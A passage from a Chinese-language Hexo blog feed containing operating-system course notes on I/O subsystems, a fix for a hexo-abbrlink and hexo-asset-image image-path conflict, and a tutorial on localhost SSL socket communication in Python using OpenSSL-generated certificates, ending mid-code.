access）控制器</li></ul></li><li>绕过CPU直接在内存与I/O设备之间进行数据传输<ul><li>DMA-request<ul><li>请求信号 获取总线 设置地址 发送acknowledge信号</li></ul></li><li>DMA-acknowledge<ul><li>接收信号 传输数据 清除request请求</li></ul></li></ul></li></ul><p><img src="/posts/8ce3e425/image-20220110181813926.png" alt="image-20220110181813926"></p><p>为实现在主机与控制器之间成块数据的直接交换，必须在DMA控制器中设置如下四类寄存器：</p><ol><li>**命令/状态寄存器(CR)：**用于接收从CPU发来的I/O命令或有关控制信息，或设备的状态。</li><li>**内存地址寄存器(MAR)：**在输入时，它存放把数据从设备传送到内存的起始目标地址；在输出时，它存放由内存到设备的内存源地址。</li><li>**数据寄存器(DR)：**用于暂存从设备到内存，或从内存到设备的数据。</li><li>**数据计数器(DC)：**存放本次CPU要读或写的字（节）数。</li></ol><p>DMA控制方式与中断驱动方式的<strong>主要区别</strong>是</p><ul><li>中断驱动方式在每个数据需要传输时中断CPU，而DMA控制方式则是在所要求传送的一批数据全部传送结束时才中断CPU；</li><li>此外，中断驱动方式数据传送是在中断处理时由CPU控制完成的，而DMA控制方式则是在DMA控制器的控制下完成的。</li></ul><h2 id="133-io应用接口"><a class="markdownIt-Anchor" href="#133-io应用接口"></a> 13.3 I/O应用接口</h2><h3 id="1331-块与字符设备"><a class="markdownIt-Anchor" href="#1331-块与字符设备"></a> 13.3.1 块与字符设备</h3><ul><li><strong>块设备</strong>包括磁盘驱动器<ul><li>read，write，seek描述了块存储设备的基本特点，这样应用程序就不必关注这些设备的低层差别。</li><li>RAW I/O或文件系统访问</li><li>内存映射文件访问是建立在块设备驱动程序之上的。内存映射接口不是提供read和write操作，而是提供通过内存中的字节数组来访问磁盘存储。</li></ul></li><li><strong>字符设备</strong>包括键盘、鼠标、串行口<ul><li>应用程序可以get或put字符。在此基础上，可以构造库以提供具有缓冲和编辑功能的按行访问。</li></ul></li></ul><h3 id="1332-网络设备"><a class="markdownIt-Anchor" href="#1332-网络设备"></a> 13.3.2 网络设备</h3><ul><li>网络I/O的性能与访问特点与磁盘I/O相比有很大差别，绝大多数操作系统所提供的网络I/O接口也不同于磁盘的read-write-seek接口。许多OS所提供的是网络套接字接口。</li><li>套接字接口还提供了select函数，以管理一组套接字。调用select可以得知哪个套接字已有接收数据需要处理，哪个套接字已有空间可以接收数据以便发送。</li></ul><h3 id="1333-时钟与定时器"><a class="markdownIt-Anchor" href="#1333-时钟与定时器"></a> 13.3.3 时钟与定时器</h3><ul><li>提供以下三个基本函数<ul><li>获取当前时间</li><li>获取已经逝去的时间</li><li>设置定时器以在T时触发操作X</li></ul></li><li>测量逝去时间和触发器操作的硬件称为可编程间隔定时器（programmable interval timer）<ul><li>可被设置为等待一定的时间，然后触发中断</li><li>也可设置成做一次或重复多次以产生定时中断</li></ul></li></ul><h3 id="1334-阻塞与非阻塞io"><a class="markdownIt-Anchor" href="#1334-阻塞与非阻塞io"></a> 13.3.4 阻塞与非阻塞I/O</h3><ul><li>阻塞 － 进程悬挂直到I/O完成为止<ul><li>容易使用与理解</li><li>对某些需求难以满足</li></ul></li><li>非阻塞 － I/O调用立刻返回<ul><li>用户接口，数据复制（缓冲I/O)</li><li>通过多线程实现</li><li>立刻返回读或写的字节数</li></ul></li><li>异步 － 进程与I/O同时运行<ul><li>难以使用</li><li>当I/O完成时，I/O系统发送信号通知进程</li></ul></li><li>非阻塞与异步系统调用的差别<ul><li>非阻塞read调用会马上返回，其所读取的数据可以等于或少于所要求的，或为零。</li><li>异步read调用所要求的传输应完整地执行，其具体执行可以是将来某个特定时间。</li></ul></li></ul><p>1.同步与异步</p><ul><li><p>同步和异步关注的是消息通信机制</p></li><li><p>同步，就是在发出一个调用时，在没有得到结果之前，该调用就不返回。但是一旦调用返回，就得到返回值了</p></li><li><p>异步则是相反，调用在发出之后，这个调用就直接返回了，所以没有返回结果</p></li></ul><p>2.阻塞与非阻塞</p><ul><li>阻塞和非阻塞关注的是程序在等待调用结果（消息，返回值）时的状态.</li><li>阻塞调用是指调用结果返回之前，当前线程会被挂起。调用线程只有在得到结果之后才会返回。</li><li>非阻塞调用指在不能立刻得到结果之前，该调用不会阻塞当前线程。</li></ul><h2 id="134-io内核子系统"><a class="markdownIt-Anchor" href="#134-io内核子系统"></a> 13.4 I/O内核子系统</h2><ul><li><p>I/O设备种类繁多，功能和传输速率差异巨大，需要多种方法来进行设备控制。这些方法共同组成了操作系统内核的I/O子系统，它将内核的其他方面从繁重的I/O设备管理中解放出来。</p></li><li><p>I/O核心子系统提供的服务主要有I/O调度、缓冲与高速缓存、设备分配与回收、假脱机、设备保护和差错处理等</p></li></ul><h3 id="1341-io调度"><a class="markdownIt-Anchor" href="#1341-io调度"></a> 13.4.1 I/O调度</h3><ul><li><p>调度一组I/O请求就是确定一个好的顺序来执行这些请求。</p><ul><li>假设磁头位于磁盘开始处，三个应用程序向该磁盘发布阻塞读调用。应用程序1需要磁盘结束部分的块，应用程序2需要磁盘开始部分的块，应用程序3需要磁盘中间部分的块。OS如果按2、3、1的顺序处理，则可以减低磁头所需移动的距离。按这种方法来重新安排服务顺序就是I/O调度的核心。</li><li>重新安排队列顺序以改善总体效率和平均响应时间</li></ul></li><li><p>实现</p><ul><li>OS通过为每个设备维护一个请求队列来实现调度。</li><li>可以试图公平，也可以根据不同的优先级进行I/O调度。</li><li>其他方法：缓冲、高速缓冲、假脱机</li></ul></li></ul><h3 id="1342-缓冲"><a class="markdownIt-Anchor" href="#1342-缓冲"></a> 13.4.2 缓冲</h3><p>采用缓冲有三个理由。</p><ul><li>一个理由是处理数据流的生产者与消费者之间的速度差异</li><li>协调传输数据大小不一致的设备</li><li>支持应用程序I/O的复制语义</li></ul><p>在设备管理子系统中，引入缓冲区的目的主要有：（解决速度慢和快的交接问题，一般不需要支持随机读写）</p><ul><li><p>缓和CPU与I/O设备间速度不匹配的矛盾。</p></li><li><p>减少对CPU的中断频率，放宽对CPU中断响应时间的限制。</p></li><li><p>解决基本数据单元大小（即数据粒度）不匹配的问题。</p></li><li><p>提高CPU和I/O设备之间的并行性。</p></li><li><p>实现方法有：</p><ul><li>釆用硬件缓冲器，但由于成本太高，除一些关键部位外，一般不釆用硬件缓冲器</li><li>釆用缓冲区（位于内存区域）。</li></ul></li></ul><h3 id="1343-高速缓存"><a class="markdownIt-Anchor" href="#1343-高速缓存"></a> 13.4.3 高速缓存</h3><p>高速缓存（ cache ）是可以保留数据副本的高速存储器。 高速缓冲区副本的访问要比原始数据访问要更为高效。</p><ul><li>磁盘高速缓存(Disk Cache)（主要用于实现数据的重复使用，支持随机读写）</li><li>操作系统中使用磁盘高速缓存技术来提高磁盘的I/O速度，对高速缓存复制的访问要比原始数据访问更为高效。例如，正在运行的进程的指令既存储在磁盘上，也存储在物理内存上，也被复制到CPU的二级和一级高速缓存中。</li><li>磁盘高速缓存是指利用内存中的存储空间来暂存从磁盘中读出的一系列盘块中的信息。因此，磁盘高速缓存在逻辑上属于磁盘，物理上则是驻留在内存中的盘块。</li><li>高速缓存在内存中分为两种形式：<ul><li>一种是在内存中开辟一个单独的存储空间作为磁速缓存，大小固定；</li><li>另一种是把未利用的内存空间作为一个缓沖池，供请求分页系统和磁盘I/O时共享。</li></ul></li></ul><h3 id="1344-假脱机与设备预留"><a class="markdownIt-Anchor" href="#1344-假脱机与设备预留"></a> 13.4.4 假脱机与设备预留</h3><p>假脱机（spool） －为了缓和CPU的高速性与I/O设备低速性之间的矛盾而引入了脱机输入/输出技术。该技术是利用专门的外围控制机，将低速I/O设备上的数据传送到高速磁盘上；或者相反。 SPOOLing的意思是外部设备同时联机操作，又称为假脱机输入/输出操作，是操作系统中釆用的一项将独占设备改造成共享设备的技术。</p><h3 id="1345-错误处理"><a class="markdownIt-Anchor" href="#1345-错误处理"></a> 13.4.5 错误处理</h3><ul><li>OS可以对短暂出错进行弥补。<ul><li>例如：磁盘read出错可以导致read重试，网络send出错可以导致resend（如果协议允许）。但是如果某个重要系统组件出现了永久错误，那么OS就不可能从中恢复。</li></ul></li><li>当I/O请求失败后，多数返回一个错误号或错误码</li><li>系统错误日志保存问题的详细报告</li></ul><h3 id="1346-io保护"><a class="markdownIt-Anchor" href="#1346-io保护"></a> 13.4.6 I/O保护</h3><h3 id="1347-内核数据结构"><a class="markdownIt-Anchor" href="#1347-内核数据结构"></a> 13.4.7 内核数据结构</h3><ul><li>内核需要保存留I/O组件使用的状态信息，包括打开文件表，网络连接，字符设备状态等</li><li>许多复杂的数据结构用来跟踪缓冲，内存分配，及“脏”块</li><li>某些OS用面向对象的方法和消息传递的方法来实现I/O</li></ul><h3 id="1348-内核io子系统小结"><a class="markdownIt-Anchor" href="#1348-内核io子系统小结"></a> 13.4.8 内核I/O子系统小结</h3><h2 id="135-把io操作转换成硬件操作"><a class="markdownIt-Anchor" href="#135-把io操作转换成硬件操作"></a> 13.5 把I/O操作转换成硬件操作</h2><ul><li>从磁盘读文件到进程的过程<ul><li>找到包含文件的设备</li><li>将文件名转换成设备实现</li><li>从磁盘上读数据至缓冲区</li><li>通知进程数据可用</li><li>将控制返回给进程</li></ul></li></ul><h2 id="136-流"><a class="markdownIt-Anchor" href="#136-流"></a> 13.6 流</h2><ul><li>STREAM － 用户级进程与设备之间完全双方的通信通道</li><li>STREAM包括<ul><li>STREAM至用户进程的接口</li><li>驱动器至设备的接口</li><li>两者之间零或多个STREAM模块</li></ul></li><li>每个模块包含一个读队列和一个写队列</li><li>队列之间通过消息传递进行通信</li></ul><h2 id="137-性能"><a class="markdownIt-Anchor" href="#137-性能"></a> 13.7 性能</h2><p>I/O是影响系统性能的重要因素之一</p><ul><li>执行设备驱动程序代码以及随着进程阻塞变化而公平且高效地调度进程都增加了CPU的负荷。</li><li>由于中断而产生的上下文切换也增加了CPU及其硬件高速缓存的负担。</li><li>用于控制器和物理内存之间的数据拷贝以及内核缓冲和应用程序数据空间之间有数据拷贝时的内存总线的负荷过重。</li><li>网络交通也能导致更高的关联切换率。</li></ul><p><strong>提高性能：</strong></p><ul><li>减少上下文切换（context switch）的次数</li><li>减少设备和应用程序之间传递数据时在内存中的数据拷贝次数<br>使用大传输、智能控制器及轮流检测来减少中断频率。</li><li>通过采用DMA智能控制器和通道来为主CPU承担简单数据拷贝，以增加并发。</li><li>将处理原语移入硬件，允许控制器内的操作与CPU和总线内的操作并发。</li><li>平衡CPU，内存子系统，总线和I/O的性能，因为任何一处的过载都会引起其他部分空闲。</li></ul><h2 id="138-小结"><a class="markdownIt-Anchor" href="#138-小结"></a> 13.8 小结</h2><h3 id="习题-4"><a class="markdownIt-Anchor" href="#习题-4"></a> 习题</h3>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用hexo-abbrlink及解决与hexo-asset-image不适配的问题</title>
    <link href="/posts/7e71e806/"/>
    <url>/posts/7e71e806/</url>
    
    <content type="html"><![CDATA[<p>插件功能：</p><p>全自动生成惟一的不带中文的博客链接</p><p>原理：</p><p>对<code>标题</code>+<code>时间</code>进行<code>md5</code>而后再转<code>base64</code>，保存在<code>front-matter</code>中。</p><p>安装：</p><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">npm install hexo-abbrlink <span class="hljs-comment">--save</span><br></code></pre></div></td></tr></table></figure><p>配置博客站点配置文件_config.yml：</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">permalink:</span> posts/:abbrlink/<br><span class="hljs-meta"># abbrlink config</span><br><span class="hljs-symbol">abbrlink:</span><br><span class="hljs-symbol">  alg:</span> crc32  <span class="hljs-meta">#support crc16(default) and crc32</span><br><span class="hljs-symbol">  rep:</span> hex    <span class="hljs-meta">#support dec(default) and hex</span><br></code></pre></div></td></tr></table></figure><p>测试：</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo s</span><br></code></pre></div></td></tr></table></figure><p>问题：</p><p>链接是修改了，但是图片不能成功显示</p><p>后来发现是与hexo-asset-image不能适配的问题，hexo-abbrlink使用后导致图片路径变化，所以不能成功识别图片，所以需要修改下面的文件</p><p>\node_modules\hexo-asset-image\index.js<br>1、在源码的12行附近<code>var link = data.permalink;</code>这一行的下面，<strong>添加</strong> 一行<code>var abbrlink = data.abbrlink</code><br>（意思是定义一个变量abbrlink）<br>2、在44行附近，源码的<code>$(this).attr('src', config.root + link + src);</code>这一行，<strong>修改</strong> 为下面一行：<br><code>$(this).attr('src', config.root + 'posts/' + abbrlink + '/' + src); //适配abbrlink</code><br>（意思是生成的图片链接中，拼接abbrlink）</p><p>然后重新hexo clean 和 hexo g，即可生效。<br>_posts文件夹下的文章，按照自己喜欢的方式整理，生成的链接是正常的，在typora中可以正常显示。</p><p>参考链接：</p><p><a href="https://github.com/rozbo/hexo-abbrlink/issues/19">https://github.com/rozbo/hexo-abbrlink/issues/19</a></p><p><a href="https://www.shangmayuan.com/a/8863defeb3264ffd84335151.html">https://www.shangmayuan.com/a/8863defeb3264ffd84335151.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Debug</category>
      
      <category>Install and Configue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Debug</tag>
      
      <tag>Install</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用OpenSSL进行SSL通信的python实现</title>
    <link href="/posts/cf547d62/"/>
    <url>/posts/cf547d62/</url>
    
    <content type="html"><![CDATA[<h1 id="openssl安装"><a class="markdownIt-Anchor" href="#openssl安装"></a> OpenSSL安装</h1><p>利用第三方提供的<a href="http://slproweb.com/products/Win32OpenSSL.html">开源工具</a>直接无脑安装</p><p>直接按照普通的windows程序next，next的安装就行了。</p><p>最后我们在环境变量中，将bin文件夹配置起来，就可以在命令行中调用OpenSSL了。如果暂时没成功的话就重启一下电脑让配置生效。</p><p><img src="/posts/cf547d62/image-20211229172206022.png" alt="image-20211229172206022"></p><p><img src="/posts/cf547d62/image-20211230110019576.png" alt="image-20211230110019576"></p><h1 id="ssl-socket通信服务端和客户端"><a class="markdownIt-Anchor" href="#ssl-socket通信服务端和客户端"></a> SSL socket通信(服务端和客户端)</h1><blockquote><p>对下方函数和命令不了解可先参考<a href="#%E9%99%84%E5%BD%95">附录</a>部分</p></blockquote><h2 id="ssl通信原理"><a class="markdownIt-Anchor" href="#ssl通信原理"></a> SSL通信原理</h2><p><img src="/posts/cf547d62/bVbClUj.png" alt="HTTP和HTTPS的关系"></p><p>SSL通信的本质是啥？本质就是客户端拿着认证机关的证书去认证对方网站到底是不是你要访问的。</p><p>因为有人会写一个假的网站骗取流量（及流量劫持）。如果一旦在这个假的网站上输入了用户名密码之后就存在着信息滥用的风险。</p><p>为了避免这样的情况，所以才有SSL这个工具。</p><ul><li><p>客户端以后每次访问一个重要的网站时就要拿着发证机关CA（Cerficate Authority）的证书和对方连接的时候验证一下。咋验证的呢？客户端连接的时候服务端也有证书，这个证书也是CA发给他们的，里面的内容进行了加密，只要拿CA发给客户的那个证书对接一些就知道对面网站的那个证书是不是真的。这就是SSL的基本逻辑。</p></li><li><p>同时通信的过程也是加密了的，这样就不太容易被窃听的人看明白（即中间人攻击）。</p></li></ul><p>所以SSL等于解决了两个问题，1 流量劫持 2 中间人攻击。</p><p><strong>SSL协议通信的握手步骤</strong>如下：</p><ul><li><p>第1步，SSL客户机连接至SSL服务器，并要求服务器验证它自身的身份；</p></li><li><p>第2步，服务器通过发送它的数字证书证明其身份。这个交换还可以包括整个证书链，直到某个根证书颁发机构（CA）。通过检查有效日期并确认证书包含可信任CA的数字签名来验证证书的有效性。</p></li><li><p>第3步，服务器发出一个请求，对客户端的证书进行验证，但是由于缺乏公钥体系结构，当今的大多数服务器不进行客户端认证。</p></li><li><p>第4步，协商用于加密的消息加密算法和用于完整性检查的哈希函数，通常由客户端提供它支持的所有算法列表，然后由服务器选择最强大的加密算法。</p></li><li><p>第5步，客户机和服务器通过以下步骤生成会话密钥：</p><ul><li>客户机生成一个随机数，并使用服务器的公钥（从服务器证书中获取）对它加密，以送到服务器上。</li><li>服务器用更加随机的数据（客户机的密钥可用时则使用客户机密钥，否则以明文方式发送数据）响应。</li></ul></li></ul><h2 id="ssl通信实现"><a class="markdownIt-Anchor" href="#ssl通信实现"></a> SSL通信实现</h2><h3 id="证书生成"><a class="markdownIt-Anchor" href="#证书生成"></a> 证书生成</h3><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal"># 1.先创建 CA 私钥，这个是用来生成ca.crt用的<br>openssl genrsa -out ca.key 2048<br><br># 2.然后生成自签名CA证书，这个才是我们要用的东西。<br># req X.509证书签发请求(CSR)管理<br># -new 新的请求<br>#  -x509 输出一个X509格式的证书 <br>#  -days X509证书的有效时间  <br>#  -key 用于签名待生成的请求证书的私钥文件<br>#  -subj 参数指定证书信息，避免在终端逐个输入<br>openssl req -new -x509 -days 3650 -key ca.key -out ca.crt -subj &quot;/C=CN/ST=hunan/L=changsha/O=HNU/OU=csee/CN=CA_zino&quot;<br><br># 3.生成服务器私钥。注意这个跟刚才那个CA不是一回事了，相当于实际业务中的需要被认证的网站。<br>openssl genrsa -out server.key 2048<br><br># 4.生成要颁发证书的证书签名请求<br>openssl req -new -key server.key -out server.csr -subj &quot;/C=CN/ST=hunan/L=changsha/O=HNU/OU=csee/CN=127.0.0.1&quot;<br><br># 5.用刚才第2步创建的 CA 证书给第4步生成的 签名请求 进行签名，表明该证书请求已被CA信任，得到一个被CA签名过的证书。<br># x509 证书处理工具。可以用来显示证书的内容，转换其格式，给CSR签名等X.509证书的管理工作<br># -req 表明输入文件是一个&quot;请求签发证书文件(CSR)&quot;，等待进行签发<br>#-CA arg 指定用于签发请求证书的根CA证书 <br>#-CAkey arg 指定用于签发请求证书的CA私钥证书文件，如果这个option没有参数输入，那么缺省认为私有密钥在CA证书文件里有<br>openssl x509 -req  -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt<br><br># 之后就是客户端用CA证书来对服务端被CA签名过的证书来进行认证<br>openssl  verify  -CAfile  ca.crt  server.crt<br><br># 查看证书具体信息<br>openssl x509 -in server.crt -noout -text<br></code></pre></div></td></tr></table></figure><p><img src="/posts/cf547d62/image-20211230085302781.png" alt="image-20211230085302781"></p><p>用CA验证服务端证书是否可信</p><p><img src="/posts/cf547d62/image-20211230092704065.png" alt="image-20211230092704065"></p><h3 id="服务端实现"><a class="markdownIt-Anchor" href="#服务端实现"></a> 服务端实现</h3><p>ssl类具体函数定义和参数含义可参考<a href="https://docs.python.org/zh-cn/3/library/ssl.html#module-ssl">官方文档</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ssl<br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-comment"># 创建了一个 SSL上下文,ssl.PROTOCOL_TLS表示选择客户端和服务器均支持的最高协议版本</span><br>context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># 加载一个私钥及对应的证书</span><br>context.load_cert_chain(certfile=<span class="hljs-string">&quot;server.crt&quot;</span>, keyfile=<span class="hljs-string">&quot;server.key&quot;</span>)<br><br>sk = socket.socket()            <span class="hljs-comment"># 创建套接字</span><br>sk.bind(ip_port)                <span class="hljs-comment"># 绑定服务地址</span><br>sk.listen(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># 监听连接请求</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;启动socket服务，等待客户端连接...&#x27;</span>)<br><br>connect_sock, address = sk.accept()     <span class="hljs-comment"># 等待连接，此处自动阻塞</span><br><span class="hljs-comment"># 包装一个现有的 Python socket,并返回一个ssl socket,server_side为true表示为服务器行为，默认为false则表示客户端</span><br>ssl_connect_sock = context.wrap_socket(connect_sock, server_side=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 一个死循环，直到客户端发送‘exit’的信号，才关闭连接</span><br>    client_data = ssl_connect_sock.recv(<span class="hljs-number">1024</span>).decode()      <span class="hljs-comment"># 接收信息</span><br>    <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:       <span class="hljs-comment"># 判断是否退出连接</span><br>        sk.close()  <span class="hljs-comment"># 关闭连接</span><br>        exit(<span class="hljs-string">&quot;通信结束&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;来自%s的客户端向你发来信息：%s&quot;</span> % (address, client_data))<br>    ssl_connect_sock.sendall(<span class="hljs-string">&#x27;服务器已经收到你的信息&#x27;</span>.encode())    <span class="hljs-comment"># 回馈信息给客户端</span><br></code></pre></div></td></tr></table></figure><h3 id="客户端实现"><a class="markdownIt-Anchor" href="#客户端实现"></a> 客户端实现</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> pprint<br><span class="hljs-comment"># 创建了一个 SSL上下文,ssl.PROTOCOL_TLS表示选择客户端和服务器均支持的最高协议版本</span><br>context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br><span class="hljs-comment"># 设置模式为CERT_REQUIRED，在此模式下，需要从套接字连接的另一端获取证书；如果未提供证书或验证失败则将引发 SSLError。</span><br>context.verify_mode = ssl.CERT_REQUIRED<br><span class="hljs-comment"># 加载一组用于验证服务器证书的CA证书</span><br>context.load_verify_locations(<span class="hljs-string">&quot;ca.crt&quot;</span>)<br><span class="hljs-comment"># 设置端口</span><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-comment"># 创建套接字</span><br>s = socket.socket()<br><span class="hljs-comment"># 包装一个现有的 Python 套接字 sock 并返回一个 SSLContext.sslsocket_class 的实例 (默认为 SSLSocket)。</span><br><span class="hljs-comment"># 返回的 SSL 套接字会绑定上下文、设置以及证书</span><br>ssl_sock = context.wrap_socket(s, server_hostname=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><br><span class="hljs-comment"># 连接服务器</span><br>ssl_sock.connect(ip_port)<br><span class="hljs-comment"># 输出证书信息</span><br>pprint.pprint(ssl_sock.getpeercert())<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 通过一个死循环不断接收用户输入，并发送给服务器</span><br>    inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要发送的信息： &quot;</span>).strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inp:     <span class="hljs-comment"># 防止输入空信息，导致异常退出</span><br>        <span class="hljs-keyword">continue</span><br>    ssl_sock.sendall(inp.encode())<br><br>    <span class="hljs-keyword">if</span> inp == <span class="hljs-string">&quot;exit&quot;</span>:   <span class="hljs-comment"># 如果输入的是‘exit’，表示断开连接</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;结束通信！&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br>    server_reply = ssl_sock.recv(<span class="hljs-number">1024</span>).decode()<br>    <span class="hljs-built_in">print</span>(server_reply)<br>s.close()    <span class="hljs-comment"># 关闭连接</span><br></code></pre></div></td></tr></table></figure><h3 id="基于线程的实现"><a class="markdownIt-Anchor" href="#基于线程的实现"></a> 基于线程的实现</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> pprint<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">client</span>():</span><br>    <span class="hljs-comment"># 创建了一个 SSL上下文,ssl.PROTOCOL_TLS表示选择客户端和服务器均支持的最高协议版本</span><br>    context = ssl.SSLContext(ssl.PROTOCOL_TLS)<br>    <span class="hljs-comment"># 设置模式为CERT_REQUIRED，在此模式下，需要从套接字连接的另一端获取证书；如果未提供证书或验证失败则将引发 SSLError。</span><br>    context.verify_mode = ssl.CERT_REQUIRED<br>    <span class="hljs-comment"># 加载一组用于验证其他对等方证书的CA证书</span><br>    context.load_verify_locations(<span class="hljs-string">&quot;ca.crt&quot;</span>)<br>    <span class="hljs-comment"># 设置端口</span><br>    ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>    <span class="hljs-comment"># 创建套接字</span><br>    s = socket.socket()<br>    <span class="hljs-comment"># 包装一个现有的 Python 套接字 sock 并返回一个 SSLContext.sslsocket_class 的实例 (默认为 SSLSocket)。</span><br>    <span class="hljs-comment"># 返回的 SSL 套接字会绑定上下文、设置以及证书</span><br>    ssl_sock = context.wrap_socket(s, server_hostname=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><br>    <span class="hljs-comment"># 连接服务器</span><br>    ssl_sock.connect(ip_port)<br>    <span class="hljs-comment"># 